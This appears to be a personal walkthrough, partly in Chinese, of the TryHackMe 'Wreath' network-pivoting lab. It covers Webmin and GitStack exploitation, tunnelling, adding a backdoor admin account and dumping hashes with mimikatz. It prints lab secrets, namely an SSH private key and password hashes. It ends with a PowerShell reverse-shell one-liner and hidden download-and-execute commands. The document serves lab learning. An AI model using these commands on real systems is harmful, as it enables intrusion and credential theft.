# Task 5  Webserver Enumeration

```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# nmap -p-15000 -vv 10.200.101.200 -oG initial-scan
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 03:17 EDT
Host is up, received echo-reply ttl 63 (0.23s latency).
Scanned at 2022-08-22 03:17:30 EDT for 261s
Not shown: 14773 filtered tcp ports (no-response), 220 filtered tcp ports (admin-prohibited)
PORT      STATE  SERVICE          REASON
22/tcp    open   ssh              syn-ack ttl 63
80/tcp    open   http             syn-ack ttl 63
443/tcp   open   https            syn-ack ttl 63
6666/tcp  closed irc              reset ttl 63
9090/tcp  closed zeus-admin       reset ttl 63
9999/tcp  open   abyss            syn-ack ttl 63
10000/tcp open   snet-sensor-mgmt syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 274.30 seconds
           Raw packets sent: 44868 (1.974MB) | Rcvd: 265 (17.652KB)

```


详细
```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# nmap -sV -Pn -A -O 10.200.101.200 -p 22,80,443,9999,10000     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 03:29 EDT
Nmap scan report for thomaswreath.thm (10.200.101.200)
Host is up (0.24s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open  http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open  ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2022-08-22T02:10:16
|_Not valid after:  2023-08-22T02:10:16
9999/tcp  open  tcpwrapped
10000/tcp open  http       MiniServ 1.890 (Webmin httpd)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   235.66 ms 10.50.102.1
2   235.80 ms thomaswreath.thm (10.200.101.200)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.34 seconds

```

> How many of the first 15000 ports are open on the target?

> 4

(明明扫出来是5个，不知道答案为什么是4个)

> What OS does Nmap think is running?

> centos

> Open the IP in your browser -- what site does the server try to redirect you to?

> https://thomaswreath.thm/

> Read through the text on the page. What is Thomas' mobile phone number?

> 447821548812 

> Look back at your service scan results: what server version does Nmap detect as running here?

> MiniServ 1.890 (Webmin httpd)

> What is the CVE number for this exploit?

> CVE-2019-15107

# Task 6  Webserver Exploitation

拿到初始shell

```
┌──(root💀kali)-[~/tryhackme/Wreath/CVE-2019-15107]
└─# chmod +x ./CVE-2019-15107.py
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/Wreath/CVE-2019-15107]
└─# ./CVE-2019-15107.py 10.200.101.200

        __        __   _               _         ____   ____ _____                                                                                                                                                                          
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|                                                                                                                                                                         
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|                                                                                                                                                                           
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___                                                                                                                                                                          
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|                                                                                                                                                                          
                                                                                                                                                                                                                                            
                                                @MuirlandOracle                                                                                                                                                                             
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.200.101.200:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.                                                                                                                                                                                          
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0

```

哈希
```
# cat /etc/shadow
root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:9
```

ssh 秘钥
```
# cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
#
```

登录
```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# chmod 600 id_rsa                                                                                          255 ⨯
                                                                                                                    
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# ssh -i id_rsa root@10.200.101.200
[root@prod-serv ~]# id
uid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@prod-serv ~]# whoami
root
```

> Which user was the server running as?

> root

> What is the root user's password hash?

> $6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::

> What is the full path to this file?

> /root/.ssh/id_rsa

# Task 8  Pivoting High-level Overview

> Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?

> Tunnelling

> Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?

> portfwd 

# Task 9  Pivoting Enumeration

> What is the absolute path to the file containing DNS entries on Linux?

> /etc/resolv.conf

> What is the absolute path to the hosts file on Windows?

> C:\Windows\System32\drivers\etc\hosts

> How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?

> for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done

# Task 10  Pivoting Proxychains & Foxyproxy

> What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?

> socks4 127.0.0.1 4242

> What command would you use to telnet through a proxy to 172.16.0.100:23?

> proxychains telnet 172.16.0.100 23

> You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?

> fp

# Task 11  Pivoting SSH Tunnelling / Port Forwarding

> If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?

> l

> Which switch combination can be used to background an SSH port forward or tunnel?

> -fN

> It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?

> nay

> What command would you use to create a pair of throwaway SSH keys for a reverse connection?

> ssh-keygen

> If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")

> ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN

> What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?

> ssh -D 8000  user@target.thm -fN

> If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.

> ssh -r 8000:127.0.0.1:80 user@172.16.0.50 -fN

# Task 12  Pivoting plink.exe

> What tool can be used to convert OpenSSH keys into PuTTY style keys?

> puttygen

# Task 13  Pivoting Socat

> Which socat option allows you to reuse the same listening port for more than one connection?

> reuseaddr 

> If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?

> ./socat tcp-l:8000 tcp:172.16.0.200:443

> What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?

> ./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &

# Task 14  Pivoting Chisel

> What command would you use to start a chisel server for a reverse connection on your attacking machine?

> ./chisel server -p 4242 --reverse

> What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?

> ./chisel client 172.16.0.200:4242 R:socks &

> How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.

> ./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &

> If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?

> ./chisel client 172.16.0.5:4444 8000:172.16.0.10:80s

# Task 15  Pivoting sshuttle

> How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16

> sshuttle -r pwned@172.16.20.7 172.16.0.0/16

> What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?

> --ssh-cmd "ssh -i priv_key"

> You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.

> -x  172.16.0.100

# Task 17  Git Server Enumeration

nmap扫描内网存活主机。-sn表示只扫描主机，不扫描端口
```
[root@prod-serv ~]# ./nmap -sn 10.200.101.1-255 -oN scan-max

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-22 13:41 BST
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-101-1.eu-west-1.compute.internal (10.200.101.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00045s latency).
MAC Address: 02:23:3F:A3:95:4B (Unknown)
Nmap scan report for ip-10-200-101-100.eu-west-1.compute.internal (10.200.101.100)
Host is up (0.00019s latency).
MAC Address: 02:50:72:C7:62:41 (Unknown)
Nmap scan report for ip-10-200-101-150.eu-west-1.compute.internal (10.200.101.150)
Host is up (-0.10s latency).
MAC Address: 02:2B:51:EC:71:61 (Unknown)
Nmap scan report for ip-10-200-101-250.eu-west-1.compute.internal (10.200.101.250)
Host is up (0.00047s latency).
MAC Address: 02:CC:C0:0D:98:63 (Unknown)
Nmap scan report for ip-10-200-101-200.eu-west-1.compute.internal (10.200.101.200)
Host is up.
Nmap done: 255 IP addresses (5 hosts up) scanned in 3.74 seconds

```

10.200.101.1是网关
10.200.101.250是ovpn服务器
10.200.101.200是linux靶机自己

因此，我们的目标是
```
10.200.101.100
10.200.101.150
```

扫描100，全端口都被过滤
```
[root@prod-serv ~]# ./nmap 10.200.101.100

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-22 13:45 BST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-101-100.eu-west-1.compute.internal (10.200.101.100)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00014s latency).
All 6150 scanned ports on ip-10-200-101-100.eu-west-1.compute.internal (10.200.101.100) are filtered
MAC Address: 02:50:72:C7:62:41 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 124.52 seconds
```

150有返回
```
[root@prod-serv ~]# ./nmap 10.200.101.150

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-22 13:48 BST
Scanned at 2022-08-22 13:48:13 BST for 207s
Not shown: 6143 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
8888/tcp open  ddi-tcp-1

```


扫描前15000个端口
```
[root@prod-serv ~]# ./nmap -p-15000 -vv 10.200.101.150

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-08-22 13:53 BST
Discovered open port 5985/tcp on 10.200.101.150
Completed SYN Stealth Scan at 13:58, 309.14s elapsed (15000 total ports)
Nmap scan report for ip-10-200-101-150.eu-west-1.compute.internal (10.200.101.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up, received arp-response (0.0082s latency).
Scanned at 2022-08-22 13:53:08 BST for 309s
Not shown: 14993 filtered ports
Reason: 14993 no-responses
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 128
135/tcp  open  epmap         syn-ack ttl 128
139/tcp  open  netbios-ssn   syn-ack ttl 128
445/tcp  open  microsoft-ds  syn-ack ttl 128
3389/tcp open  ms-wbt-server syn-ack ttl 128
5985/tcp open  wsman         syn-ack ttl 128
8888/tcp open  ddi-tcp-1     syn-ack ttl 128

```

> Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?

> 2

> In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)

> 100,150

> Scan the hosts -- which one does not return a status of "filtered" for every port (submit the last octet only)?

> 150

> Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?

> 80,3389,5985

> Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?

> http

# Task 18  Git Server Pivoting

用ssh做一个动态端口转发

```
sshuttle -r root@10.200.101.200 --ssh-cmd "ssh -i id_rsa" 10.200.101.0/24 -x 10.200.101.200
```


浏览器访问

1661223640246.jpg

搜索web app漏洞
```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# searchsploit Gitstack                                                                                      255 ⨯
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
GitStack - Remote Code Execution                                                   | php/webapps/44044.md
GitStack - Unsanitized Argument Remote Code Execution (Metasploit)                 | windows/remote/44356.rb
GitStack 2.3.10 - Remote Code Execution                                            | php/webapps/43777.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

有一个远程执行漏洞

> What is the name of the program running the service?

> Gitstack

> Do these default credentials work (Aye/Nay)?

> nay

> There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?

> 43777

# Task 19  Git Server Code Review

> Look at the information at the top of the script. On what date was this exploit written?

> 18.01.2018

> Bearing this in mind, is the script written in Python2 or Python3?

> python2

> Just to confirm that you have been paying attention to the script: What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit?

> csrftoken

# Task 20  Git Server Exploitation

exploit-db的脚本我这边会报错，使用github上[这个脚本](https://github.com/TBernard97/Gitstack-2.3.10-Exploit-Refactor/blob/master/exploit_refactored.py)

拿到shell

```
┌──(root💀kali)-[~/tryhackme/Wreath]
└─# python3 exploit_refactored.py 10.200.101.150
[+] Connected to http://10.200.101.150:80/ successfully.
[*] Creating users on http://10.200.101.150:80/.
[*] Found user twreath
[*] Web repository already created
[*] Getting repository list
[*] Found repo: Website
[*] Adding user twreath to repository
[*] Disabling everyone user access to repository
b'Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. '

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.
[*] Type 'exit' to exit.

> whoami
"nt authority\system
" 

> hostname
"git-serv

```

> What is the hostname for this target?

> git-serv

> What operating system is this target?

> Windows

> What user is the server running as?

> NT AUTHORITY\SYSTEM

> How many make it to the waiting listener?

> 0



由于我们现在是system账号，并且靶机开启了3389和5985端口，可以通过添加一个添加一个用户到rdp组合administrators组，从而远程登录


```

> net user max max123456 /add
"The command completed successfully.

" 

> net localgroup Administrators max /add
"The command completed successfully.

" 

> net localgroup "Remote Management Users" max /add
"The command completed successfully.


```


rdp登录
```
xfreerdp /u:max /p:'max123456' /v:10.200.101.150 +clipboard 
```

win登录
```
evil-winrm -u max -p max123456 -i 10.200.101.150
```

# Task 21  Git Server Stabilisation & Post Exploitation

rdp进去导出哈希

```
C:\Users\max\Documents>.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

668     {0;000003e7} 1 D 20153          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00501fb8} 3 F 6391130     GIT-SERV\max    S-1-5-21-3335744492-1614955177-2693036043-1003  (15g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 6436616     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::sam
Domain : GIT-SERV
SysKey : 0841f6354f4b96d21b99345d07b66571
Local SID : S-1-5-21-3335744492-1614955177-2693036043

SAMKey : f4a3c96f8149df966517ec3554632cf4

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 68b1608793104cca229de9f1dfb6fbae

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-1696O63F791Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8f7590c29ffc78998884823b1abbc05e6102a6e86a3ada9040e4f3dcb1a02955
      aes128_hmac       (4096) : 503dd1f25a0baa75791854a6cfbcd402
      des_cbc_md5       (4096) : e3915234101c6b75

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-1696O63F791Administrator
    Credentials
      des_cbc_md5       : e3915234101c6b75


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: c70854ba88fb4a9c56111facebdf3c36

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e389f51da73551518c3c2096c0720233

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1d916df8ca449782c73dbaeaa060e0785364cf17c18c7ff6c739ceb1d7fdf899
      aes128_hmac       (4096) : 33ee2dbd44efec4add81815442085ffb
      des_cbc_md5       (4096) : b6f1bac2346d9e2c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : b6f1bac2346d9e2c


RID  : 000003e9 (1001)
User : Thomas
  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 03126107c740a83797806c207553cef7

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVThomas
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 19e69e20a0be21ca1befdc0556b97733c6ac74292ab3be93515786d679de97fe
      aes128_hmac       (4096) : 1fa6575936e4baef3b69cd52ba16cc69
      des_cbc_md5       (4096) : e5add55e76751fbc
    OldCredentials
      aes256_hmac       (4096) : 9310bacdfd5d7d5a066adbb4b39bc8ad59134c3b6160d8cd0f6e89bec71d05d2
      aes128_hmac       (4096) : 959e87d2ba63409b31693e8c6d34eb55
      des_cbc_md5       (4096) : 7f16a47cef890b3b

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVThomas
    Credentials
      des_cbc_md5       : e5add55e76751fbc
    OldCredentials
      des_cbc_md5       : 7f16a47cef890b3b


RID  : 000003ea (1002)
User : crimsonsolid
  Hash NTLM: 3e678b266d1d449e531e92bec33b6d27

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 1ea046bff032220775c4baa7316df55e

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVcrimsonsolid
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8f372574e920c61b28546de59f13a198e861f2147f68bb91a0d2e235f4cf8b3f
      aes128_hmac       (4096) : f9889efb598feaa32b62b253745d17a8
      des_cbc_md5       (4096) : a21f9702bc54080e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVcrimsonsolid
    Credentials
      des_cbc_md5       : a21f9702bc54080e


RID  : 000003eb (1003)
User : max
  Hash NTLM: cf4836436d2bebf810c5167ac154bdcb

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 959f2ea9834aca1bbd4ff41a5e2f0901

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVmax
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : f1be2fd9f46ad817398db9919a859283d93d9080abff427929f98d25432e03b6
      aes128_hmac       (4096) : 863d45f005ac9781f52e94a5f2b2f503
      des_cbc_md5       (4096) : dcd5b0542abc4525

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVmax
    Credentials
      des_cbc_md5       : dcd5b0542abc4525

```

> What is the Administrator password hash?

> 37db630168e5f82aafa8461e05c6bbd1

> What is the NTLM password hash for the user "Thomas"?

> 02d90eda8f6b6b06c32d5f207831101f

> What is Thomas' password?

> i<3ruby

# Task 24  Command and Control Empire: Overview

> Can we get an agent back from the git server directly (Aye/Nay)?

> nay

# Task 27  Command and Control Empire: Agents

> Using the help command for guidance: in Empire CLI, how would we run the whoami command inside an agent?

> shell whoami


firewall-cmd --zone=public --add-port 8000/tcp

./socat-max tcp-l:15123 tcp:10.50.102.104:80 &


./socat-max tcp-l:8000 tcp:10.50.102.104:443



powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.101.200',8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"



powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.50.102.104:3389/3389'))"


powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.200.101.200:15123/a'))"